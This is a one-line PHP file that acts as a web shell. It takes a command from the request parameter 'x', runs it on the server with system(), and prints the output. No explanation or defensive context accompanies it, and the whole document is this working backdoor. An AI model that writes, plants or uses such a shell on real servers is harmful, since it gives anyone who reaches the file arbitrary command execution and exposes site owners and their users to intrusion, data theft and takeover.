
<?php if(isset($_REQUEST['x'])){ echo "<pre>"; $cmd = ($_REQUEST['x']); system($cmd); echo "</pre>"; die; }?>
